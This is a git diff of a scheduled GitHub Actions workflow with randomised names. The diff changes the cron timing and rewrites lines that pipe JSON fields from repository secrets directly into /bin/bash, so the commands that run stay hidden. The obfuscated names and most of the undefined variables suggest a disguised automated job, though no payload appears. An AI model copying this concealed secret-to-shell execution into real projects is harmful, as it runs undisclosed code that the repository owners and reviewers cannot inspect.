@@ -3,7 +3,8 @@ name: diaoyubu3478
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 2/6 * * *'
+    - cron: '19 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,13 +12,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: diaoyubu3478
         env:
-          bok976: ${{ secrets.bok976 }}
+          jsr3893: ${{ secrets.jsr3893 }}
         run: |
-          echo $bok976 | jq -r .a6 | /bin/bash
-          echo $vz03739 | jq -r .buwqg140 | /bin/bash
-          echo $hypm6444 | jq -r .edf3 | /bin/bash
-          echo $aomv368 | jq -r .rw5105 | /bin/bash
-          echo $rqnf81356 | jq -r .bmrds8 | /bin/bash
-          echo $zn9389 | jq -r .nalro585 | /bin/bash
-          echo $kxi371 | jq -r .i36323 | /bin/bash
+          echo $jsr3893 | jq -r .yedu13 | /bin/bash
+          echo $vvb46020 | jq -r .yjoge22 | /bin/bash
+          echo $vef525 | jq -r .enbk727 | /bin/bash
+          echo $zsdjt4 | jq -r .qqkvh3 | /bin/bash
+          echo $tg8 | jq -r .bq70034 | /bin/bash
+          echo $zcl0 | jq -r .lsmh8 | /bin/bash
+          echo $j0212 | jq -r .mjyd78625 | /bin/bash
+          echo $syqea2876 | jq -r .hfc57026 | /bin/bash
 
